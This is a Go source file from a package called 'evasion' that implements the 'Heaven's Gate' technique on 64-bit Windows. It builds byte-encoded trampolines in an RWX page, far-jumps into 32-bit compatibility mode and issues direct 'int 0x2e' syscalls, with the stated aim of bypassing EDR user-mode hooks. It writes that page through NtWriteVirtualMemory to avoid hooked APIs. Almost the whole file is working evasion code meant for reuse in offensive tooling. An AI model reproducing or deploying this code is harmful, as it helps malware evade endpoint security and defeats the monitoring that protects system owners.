//go:build windows && amd64
// +build windows,amd64

package evasion

// Heaven's Gate — 64-bit to 32-bit compat-mode syscall technique.
//
// A native 64-bit process switches CS from 0x33 (long mode) to 0x23 (compat
// mode) via a far RETF, then issues "int 0x2e" with EAX=SSN and EDX=arg block.
// Because EDR user-mode hooks are only patched into the 64-bit code path,
// they are bypassed entirely.
//
// SSN resolution reuses hgFindSSN() — SSNs are identical for both paths in
// a native 64-bit process (not WoW64).
//
// Limitations:
//   - Every argument value must fit in 32 bits (pointers < 4 GB).
//   - Up to 4 arguments.  Extend stub32/arg-block if more are needed.
//   - The RWX page must be allocated below 4 GB; NewHGateProc returns nil
//     if either constraint is violated.

import (
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

// HGateProc holds the base address of a combined RWX allocation that contains:
//   offset 0x00: 64-bit trampoline  (called from Go via syscall.SyscallN)
//   offset 0x50: 32-bit syscall stub (runs in CS=0x23)
//   offset 0x60: 6-byte far-return pointer (m16:32 for JMP FAR)
//   offset 0x70: 64-bit continuation  (cleans up and returns to Go)
type HGateProc struct {
	stub uintptr
}

// NewHGateProc resolves the SSN for name and builds a Heaven's Gate stub.
// Returns nil on resolution failure, allocation failure, or high address.
func NewHGateProc(name string) *HGateProc {
	ssn, ok := hgFindSSN(name)
	if !ok {
		return nil
	}
	return buildHGateStub(ssn)
}

// Call invokes the Heaven's Gate stub with up to 4 arguments.
// All values and any pointed-to data must reside below 4 GB.
func (p *HGateProc) Call(a0, a1, a2, a3 uintptr) (r1 uintptr, err syscall.Errno) {
	if p == nil || p.stub == 0 {
		return 0, syscall.EINVAL
	}
	var r2 uintptr
	r1, r2, err = syscall.SyscallN(p.stub, a0, a1, a2, a3)
	_ = r2
	return
}

// buildHGateStub builds and patches the combined stub for the given SSN.
func buildHGateStub(ssn uint16) *HGateProc {
	const pageSize = 0x1000
	base := hgAlloc(pageSize)
	if base == 0 {
		return nil
	}
	// All absolute addresses embedded in the 32-bit stub must fit in 32 bits.
	if base+0x200 > 0xFFFFFFFF {
		windows.VirtualFree(windows.Handle(base), 0, windows.MEM_RELEASE)
		return nil
	}

	// Fixed offsets within the page.
	const (
		off32   = 0x50
		offFPtr = 0x60
		offCont = 0x70
	)

	addr32   := uint32(base + off32)
	addrFPtr := uint32(base + offFPtr)
	addrCont := uint32(base + offCont)

	// === 64-bit trampoline at offset 0 (46 bytes) ===
	//
	// Called via syscall.SyscallN: RCX=a0, RDX=a1, R8=a2, R9=a3.
	//
	// Builds a 32-bit arg block on the stack at [RSP]:
	//   [RSP+ 0] = 0  (fake return address expected by int 0x2e frame)
	//   [RSP+ 4] = a0 (ECX, 32-bit)
	//   [RSP+ 8] = a1 (EDX, 32-bit)
	//   [RSP+12] = a2 (R8D, 32-bit)
	//   [RSP+16] = a3 (R9D, 32-bit)
	//
	// Saves RSP in RBX (accessible as EBX in 32-bit compat mode), then
	// far-jumps to the 32-bit stub by pushing addr32 + 0x23 and doing RETF.
	//
	// Byte-exact encoding:
	//   48 83 EC 28           sub  rsp, 0x28           ; 4
	//   89 4C 24 04           mov  [rsp+4], ecx         ; 4
	//   89 54 24 08           mov  [rsp+8], edx         ; 4
	//   44 89 44 24 0C        mov  [rsp+C], r8d          ; 5
	//   44 89 4C 24 10        mov  [rsp+10], r9d         ; 5
	//   C7 04 24 00 00 00 00  mov  dword [rsp], 0        ; 7
	//   48 89 E3              mov  rbx, rsp              ; 3
	//   48 B8 xx xx xx xx     mov  rax, addr32 (8 bytes) ; 10
	//         00 00 00 00
	//   50                    push rax                   ; 1
	//   6A 23                 push 0x23                  ; 2
	//   CB                    retf                       ; 1  → total 46
	tramp64 := [46]byte{
		0x48, 0x83, 0xEC, 0x28,
		0x89, 0x4C, 0x24, 0x04,
		0x89, 0x54, 0x24, 0x08,
		0x44, 0x89, 0x44, 0x24, 0x0C,
		0x44, 0x89, 0x4C, 0x24, 0x10,
		0xC7, 0x04, 0x24, 0x00, 0x00, 0x00, 0x00,
		0x48, 0x89, 0xE3,
		0x48, 0xB8,
		byte(addr32), byte(addr32 >> 8), byte(addr32 >> 16), byte(addr32 >> 24),
		0x00, 0x00, 0x00, 0x00,
		0x50,
		0x6A, 0x23,
		0xCB,
	}

	// === 32-bit syscall stub at offset off32 (15 bytes) ===
	//
	// Runs in CS=0x23. EBX = RSP from 64-bit trampoline = arg block pointer.
	//   89 DA                 mov  edx, ebx         ; EDX = arg block
	//   B8 lo hi 00 00        mov  eax, SSN
	//   CD 2E                 int  0x2e
	//   FF 2D addr32(addrFPtr) jmp far [addrFPtr]   ; return to 64-bit CS=0x33
	stub32 := [15]byte{
		0x89, 0xDA,
		0xB8, byte(ssn), byte(ssn >> 8), 0x00, 0x00,
		0xCD, 0x2E,
		0xFF, 0x2D,
		byte(addrFPtr), byte(addrFPtr >> 8), byte(addrFPtr >> 16), byte(addrFPtr >> 24),
	}

	// === 6-byte far-return pointer at offset offFPtr ===
	//
	// m16:32 format read by JMP FAR [mem] in 32-bit compat mode:
	//   bytes 0-3 = 32-bit target offset (addrCont)
	//   bytes 4-5 = 16-bit CS selector  (0x33 = 64-bit long-mode code)
	//
	// Loading CS=0x33 switches the CPU back to 64-bit long mode.
	farPtr := [6]byte{
		byte(addrCont), byte(addrCont >> 8), byte(addrCont >> 16), byte(addrCont >> 24),
		0x33, 0x00,
	}

	// === 64-bit continuation at offset offCont (7 bytes) ===
	//
	// CPU arrives here (CS=0x33) after int 0x2e returns and JMP FAR fires.
	// EAX = NTSTATUS (kernel return value); RSP as it was after sub rsp,0x28.
	//   48 83 C4 28   add  rsp, 0x28     ; undo the arg-block allocation
	//   48 98         cdqe               ; sign-extend EAX → RAX (NTSTATUS is int32)
	//   C3            ret
	cont64 := [7]byte{
		0x48, 0x83, 0xC4, 0x28,
		0x48, 0x98,
		0xC3,
	}

	// Write all sections into the RWX page via NtWriteVirtualMemory.
	// ntWrite bypasses VirtualProtect and any user-mode hook on that call.
	type patch struct {
		off  uintptr
		data []byte
	}
	for _, p := range []patch{
		{0, tramp64[:]},
		{off32, stub32[:]},
		{offFPtr, farPtr[:]},
		{offCont, cont64[:]},
	} {
		ntWrite(base+p.off, p.data)
	}

	return &HGateProc{stub: base}
}

// ptrFits32 reports whether p can be represented as a 32-bit address.
// Use before passing a pointer argument to HGateProc.Call.
func ptrFits32(p unsafe.Pointer) bool {
	return uintptr(p) <= 0xFFFFFFFF
}
